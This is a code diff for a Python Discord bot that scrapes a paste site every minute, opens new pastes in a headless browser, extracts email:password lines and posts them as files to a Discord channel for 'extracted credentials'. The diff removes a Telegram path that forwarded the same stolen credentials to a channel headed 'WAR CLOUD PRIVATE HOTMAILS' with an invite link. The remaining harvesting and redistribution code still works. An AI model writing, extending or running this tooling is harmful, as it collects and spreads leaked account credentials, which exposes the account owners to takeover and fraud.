@@ -7,11 +7,9 @@ import asyncio
 import io
 import logging
 import os
+import re
 from datetime import datetime, timezone
 
-import re
-import unicodedata
-import aiohttp
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
@@ -22,9 +20,6 @@ DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
 CHANNEL_ID         = int(os.environ["CHANNEL_ID"])          # all found URLs as .txt every minute
 NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])      # new URL alerts only
 CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"]) # extracted credentials from new pastes
-
-TELEGRAM_TOKEN  = os.environ["TELEGRAM_TOKEN"]   # bot token from @BotFather
-TELEGRAM_CHAT   = os.environ["TELEGRAM_CHAT"]    # channel like @mychannel or -100xxxxxxxx
 
 CHECK_INTERVAL = 1
 PAGES_TO_SCAN  = 5
@@ -42,60 +37,15 @@ log = logging.getLogger("mercury")
 posted_urls: set = set()
 
 # ─── HELPERS ─────────────────────────────────────────────────────────────────
-EMOJI_RE = re.compile(
-    "["
-    u"\U0001F600-\U0001F64F"
-    u"\U0001F300-\U0001F5FF"
-    u"\U0001F680-\U0001F9FF"
-    u"\U00002600-\U000027BF"
-    u"\U0001FA00-\U0001FA6F"
-    u"\U0001FA70-\U0001FAFF"
-    u"\U00002702-\U000027B0"
-    "]+", flags=re.UNICODE
-)
-
-TELEGRAM_DOMAINS = ("t.me", "telegram.me", "telegram.dog")
-
-def is_junk_line(line: str) -> bool:
-    if "|" in line:
-        return True
-    if any(d in line.lower() for d in TELEGRAM_DOMAINS):
-        return True
-    if EMOJI_RE.search(line):
-        return True
-    return False
-
 def extract_credentials(raw: str) -> list[str]:
     lines = []
     for line in raw.splitlines():
         line = line.strip()
-        if not line:
-            continue
-        if is_junk_line(line):
-            continue
         if "@" in line and ":" in line:
             parts = line.split(":", 1)
             if len(parts) == 2 and "@" in parts[0] and "." in parts[0]:
                 lines.append(line)
     return lines
-
-
-async def send_telegram_file(text: str, filename: str):
-    """Send a .txt file to a Telegram channel via Bot API."""
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
-    data = aiohttp.FormData()
-    data.add_field("chat_id", TELEGRAM_CHAT)
-    data.add_field("document", text.encode(), filename=filename, content_type="text/plain")
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, data=data) as resp:
-                if resp.status != 200:
-                    body = await resp.text()
-                    log.error(f"Telegram API error {resp.status}: {body}")
-                else:
-                    log.info("Posted to Telegram")
-    except Exception as e:
-        log.error(f"Failed to send to Telegram: {e}")
 
 # ─── BOT ─────────────────────────────────────────────────────────────────────
 intents = discord.Intents.default()
@@ -142,7 +92,7 @@ async def monitor_loop():
         page = await browser.new_page()
 
         try:
-            # ── Step 1: scrape archive for hotmail paste URLs ──────────────
+            # ── Step 1: scrape archive ─────────────────────────────────────
             await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=20000)
             await page.wait_for_timeout(2000)
 
@@ -198,16 +148,15 @@ async def monitor_loop():
                     seen_this_run.add(item["url"])
                     pastes.append(item)
 
-            # ── Step 2: channel 1 — all found URLs as .txt ─────────────────
+            # ── Step 2: channel 1 — all found URLs as .txt ────────────────
             await post_pastes(channel, pastes)
 
-            # ── Step 3: figure out which are new & mark them seen NOW ───
+            # ── Step 3: figure out new pastes & mark seen immediately ─────
             new_pastes = [p for p in pastes if p["url"] not in posted_urls]
             if not new_pastes:
                 log.info("No new pastes this run")
                 return
 
-            # Mark seen immediately so even if steps below crash, we don't repeat
             for p in new_pastes:
                 posted_urls.add(p["url"])
 
@@ -220,7 +169,7 @@ async def monitor_loop():
             except Exception as e:
                 log.error(f"Could not post to new channel: {e}")
 
-            # ── Step 5: channel 3 — visit each new paste, extract creds ───
+            # ── Step 5: channel 3 — extract creds from new pastes ─────────
             try:
                 content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
                 combined = []
@@ -232,7 +181,6 @@ async def monitor_loop():
                         await page.goto(url, wait_until="networkidle", timeout=15000)
                         await page.wait_for_timeout(1500)
 
-                        # Try ace editor API
                         raw = await page.evaluate("""
                             () => {
                                 if (window.ace) {
@@ -251,7 +199,6 @@ async def monitor_loop():
                             }
                         """)
 
-                        # Fallback: scroll ace lines
                         if not raw or not raw.strip():
                             await page.evaluate("""
                                 () => {
@@ -263,7 +210,6 @@ async def monitor_loop():
                             lines = await page.query_selector_all("div.ace_line")
                             raw = "\n".join([(await l.text_content() or "").strip() for l in lines])
 
-                        # Fallback: pre tag
                         if not raw or not raw.strip():
                             pre = await page.query_selector("pre")
                             if pre:
@@ -287,23 +233,6 @@ async def monitor_loop():
                     filename = f"content_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
                     await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
                     log.info("Posted combined content file")
-                    tg_header = (
-                        "WAR CLOUD PRIVATE HOTMAILS\n"
-                        "------------------------\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "\n"
-                    )
-                    creds_only = "\n\n".join(
-                        "\n".join(
-                            line for line in block.splitlines()
-                            if not line.startswith("#")
-                        )
-                        for block in combined
-                    )
-                    tg_output = tg_header + creds_only
-                    await send_telegram_file(tg_output, filename)
                 else:
                     log.info("Nothing to post to content channel")
 
@@ -327,7 +256,6 @@ async def before_monitor():
 async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
     await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
     channel = bot.get_channel(CHANNEL_ID) or await bot.fetch_channel(CHANNEL_ID)
-    # Trigger a one-off run of the loop logic
     await monitor_loop()
     await interaction.followup.send("✅ Done.", ephemeral=True)
 
